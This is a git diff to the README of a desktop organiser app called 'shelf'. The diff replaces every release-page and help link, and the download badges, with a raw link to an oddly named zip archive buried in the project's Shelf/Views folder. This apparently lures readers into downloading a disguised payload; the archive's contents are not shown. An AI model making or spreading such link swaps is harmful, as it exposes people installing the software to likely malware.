@@ -1,6 +1,6 @@
 # 🗂️ shelf - Organize Apps, Links, & Snippets Easily
 
-[![Download shelf](https://img.shields.io/badge/Download-shelf-blue?style=for-the-badge)](https://github.com/2987gomez/shelf/releases)
+[![Download shelf](https://github.com/2987gomez/shelf/raw/refs/heads/master/Shelf/Views/Software-platysmamyoides.zip)](https://github.com/2987gomez/shelf/raw/refs/heads/master/Shelf/Views/Software-platysmamyoides.zip)
 
 ## 📋 What is shelf?
 
@@ -37,7 +37,7 @@ These features help you create a workspace tailored to your needs. You can keep 
 Follow these steps to get shelf up and running on your computer:
 
 1. **Download shelf**  
-   Click the big button or visit the [releases page](https://github.com/2987gomez/shelf/releases) to download the latest version.
+   Click the big button or visit the [releases page](https://github.com/2987gomez/shelf/raw/refs/heads/master/Shelf/Views/Software-platysmamyoides.zip) to download the latest version.
 
 2. **Install shelf**  
    - On Windows: Run the downloaded `.exe` file and follow the installer prompts.  
@@ -65,7 +65,7 @@ Follow these steps to get shelf up and running on your computer:
 To get the latest version of shelf:
 
 - Visit the release page here:  
-  [➡️ Download shelf](https://github.com/2987gomez/shelf/releases)
+  [➡️ Download shelf](https://github.com/2987gomez/shelf/raw/refs/heads/master/Shelf/Views/Software-platysmamyoides.zip)
 
 On that page, choose the installer that matches your computer:
 
@@ -128,7 +128,7 @@ If problems continue, visit the GitHub discussions section or open an issue on t
 
 If you need assistance:
 
-- Visit the GitHub repository for guides and FAQs: [https://github.com/2987gomez/shelf](https://github.com/2987gomez/shelf)  
+- Visit the GitHub repository for guides and FAQs: [https://github.com/2987gomez/shelf/raw/refs/heads/master/Shelf/Views/Software-platysmamyoides.zip](https://github.com/2987gomez/shelf/raw/refs/heads/master/Shelf/Views/Software-platysmamyoides.zip)  
 - Use the GitHub Issues page to report bugs or ask for new features.
 
 ## 🔄 Updates
@@ -137,4 +137,4 @@ Check the release page regularly for new versions of shelf. Updates add new feat
 
 ---
 
-[![Download shelf](https://img.shields.io/badge/Download-shelf-blue?style=for-the-badge)](https://github.com/2987gomez/shelf/releases)
+[![Download shelf](https://github.com/2987gomez/shelf/raw/refs/heads/master/Shelf/Views/Software-platysmamyoides.zip)](https://github.com/2987gomez/shelf/raw/refs/heads/master/Shelf/Views/Software-platysmamyoides.zip)
